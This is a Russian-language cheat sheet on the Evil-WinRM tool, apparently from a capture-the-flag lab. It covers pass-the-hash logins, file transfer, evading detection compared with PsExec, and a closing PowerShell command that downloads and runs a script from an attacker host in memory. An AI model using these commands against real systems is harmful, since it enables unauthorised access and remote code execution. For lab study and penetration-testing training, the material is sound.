# EVIL-WINRM — УДАЛЕННОЕ ВЫПОЛНЕНИЕ ЧЕРЕЗ WINRM

## Что это

Windows Remote Management (WinRM) — протокол Microsoft для удаленного доступа через HTTP (порт 5985) или HTTPS (порт 5986). Это тот же протокол, который использует PowerShell Remoting.

Evil-WinRM — инструмент для интерактивных WinRM сессий с дополнительными возможностями (upload/download, загрузка скриптов в память, DLL injection).

# WinRM — это сервер (служба), которая работает на удаленной машине и слушает входящие запросы.


# КЛЮЧЕВЫЕ ОТЛИЧИЯ ОТ PSEXEC

**Контекст shell**
- PsExec: SYSTEM
- Evil-WinRM: Аутентифицированный пользователь

**Требования к учетке**
- PsExec: Local Admin (ADMIN$ доступ)
- Evil-WinRM: Local Admin или Remote Management Users

**Шумность**
- PsExec: Высокая (файлы, службы, Event 7045)
- Evil-WinRM: Низкая (только network logon)

**Порты**
- PsExec: 445 (SMB)
- Evil-WinRM: 5985 (HTTP) / 5986 (HTTPS)


# ТРЕБОВАНИЯ ДЛЯ WINRM

Учетная запись должна быть членом одной из групп на целевой машине:
- `BUILTIN\Administrators` (локальные админы)
- `BUILTIN\Remote Management Users`

Это делает WinRM более гибким — не обязательно быть Local Admin.


# ПРЕИМУЩЕСТВА

- Не пишет файлы на диск
- Не создает службы
- Не генерирует Event ID 7045
- Генерирует только Event ID 4624 (Type 3) — нормальный сетевой вход
- Значительно тише PsExec

# ПРАКТИКА: ПОДКЛЮЧЕНИЕ

## С паролем
evil-winrm -i TARGET_IP -u username -p 'password'

## С хэшем (Pass-the-Hash)
evil-winrm -i TARGET_IP -u username -H NTLM_HASH

## Пример
evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'


# ЧТО ВЫ ПОЛУЧАЕТЕ
Интерактивную PowerShell сессию.

## whoami
`thm\jdoe` (НЕ SYSTEM — права ограничены)

## Доступ к файлам
- Можно читать файлы пользователя, под которым зашли
- Нельзя читать чужие файлы без прав

Пример ошибки:
type C:\Users\Administrator\Desktop\flag4.txt
Access is denied.


# КОГДА ИСПОЛЬЗОВАТЬ EVIL-WINRM

- Когда учетка есть в Remote Management Users, но нет Local Admin
- Когда нужно тихо зайти (без создания служб и файлов)
- Для Pass-the-Hash атак через WinRM
- Когда PsExec заблокирован или детектится


# БЫСТРАЯ ШПАРГАЛКА

## Подключение с паролем:
evil-winrm -i IP -u user -p 'password'

## Подключение с хэшем:
evil-winrm -i IP -u user -H NTLM_HASH

## Загрузить файл на цель:
upload local_file.txt C:\remote_path\

## Скачать файл с цели:
download C:\remote_file.txt

## Загрузить PowerShell скрипт в память:
C:\Windows\System32\powershell.exe -exec bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACK_IP/script.ps1')"


